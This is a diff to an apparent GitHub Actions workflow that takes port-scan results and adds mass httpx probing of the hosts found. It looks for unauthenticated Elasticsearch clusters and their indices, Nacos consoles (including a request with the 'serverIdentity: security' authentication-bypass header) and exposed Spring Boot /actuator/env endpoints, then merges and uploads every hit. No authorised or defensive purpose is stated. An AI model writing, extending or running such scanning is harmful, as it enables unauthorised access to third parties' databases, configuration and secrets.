@@ -424,11 +424,39 @@ jobs:
           grep '^open' raw.txt 2>/dev/null | awk '{print $4":"$3}' | sort -u > r.txt
           echo "Found $(wc -l < r.txt) open ports"
 
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null
+          export PATH=$PATH:$(go env GOPATH)/bin
+
+          grep ':9200$' r.txt | sed 's/:9200$//' > p1.txt || true
+          if [ -s p1.txt ]; then
+            sed 's/$/:9200/' p1.txt | httpx -silent -timeout 5 -threads 100 -mc 200 -ms 'cluster_name' -o v1.txt 2>/dev/null || true
+            sed 's/$/:9200\/_cat\/indices/' p1.txt | httpx -silent -timeout 5 -threads 100 -mc 200 -o v2.txt 2>/dev/null || true
+          fi
+
+          grep ':8848$' r.txt | sed 's/$/\/nacos\/v1\/console\/namespaces/' > p2.txt || true
+          if [ -s p2.txt ]; then
+            sed 's/^/http:\/\//' p2.txt | httpx -silent -timeout 5 -threads 100 -mc 200 -ms 'namespace' -o v3.txt 2>/dev/null || true
+            sed 's/^/http:\/\//' p2.txt | httpx -silent -timeout 5 -threads 100 -mc 200 -ms 'namespace' -H 'serverIdentity: security' -o v4.txt 2>/dev/null || true
+          fi
+
+          grep -E ':(8080|8090|8070)$' r.txt | sed 's/^/http:\/\//' | sed 's/$/\/actuator\/env/' > p3.txt || true
+          if [ -s p3.txt ]; then
+            cat p3.txt | httpx -silent -timeout 5 -threads 100 -mc 200 -ms 'propertySources' -o v5.txt 2>/dev/null || true
+          fi
+
+          for f in v1 v2 v3 v4 v5; do [ -f ${f}.txt ] && echo "${f}: $(wc -l < ${f}.txt)"; done
+
       - name: upload
         uses: actions/upload-artifact@v4
         with:
           name: d-${{ matrix.idx }}
-          path: r.txt
+          path: |
+            r.txt
+            v1.txt
+            v2.txt
+            v3.txt
+            v4.txt
+            v5.txt
           retention-days: 3
 
   merge:
@@ -444,17 +472,9 @@ jobs:
       - name: combine
         run: |
           cat d-*/r.txt 2>/dev/null | sort -u > all.txt
-          echo "=== Total ==="
-          wc -l all.txt
-          echo "=== By port ==="
-          for p in 8070 8090 8848 9200; do
-            cnt=$(grep ":${p}$" all.txt | wc -l)
-            echo "Port $p: $cnt"
-          done
-          grep ':8070$' all.txt > apollo_portal.txt || true
-          grep ':8090$' all.txt > apollo_admin.txt || true
-          grep ':8848$' all.txt > nacos.txt || true
-          grep ':9200$' all.txt > es.txt || true
+          for p in 8070 8090 8848 9200; do grep ":${p}$" all.txt > p${p}.txt 2>/dev/null || true; done
+          for f in v1 v2 v3 v4 v5; do cat d-*/${f}.txt 2>/dev/null | sort -u > ${f}.txt || true; done
+          wc -l all.txt p*.txt v*.txt 2>/dev/null
 
       - name: upload-merged
         uses: actions/upload-artifact@v4
@@ -462,8 +482,13 @@ jobs:
           name: results
           path: |
             all.txt
-            apollo_portal.txt
-            apollo_admin.txt
-            nacos.txt
-            es.txt
+            p8070.txt
+            p8090.txt
+            p8848.txt
+            p9200.txt
+            v1.txt
+            v2.txt
+            v3.txt
+            v4.txt
+            v5.txt
           retention-days: 7
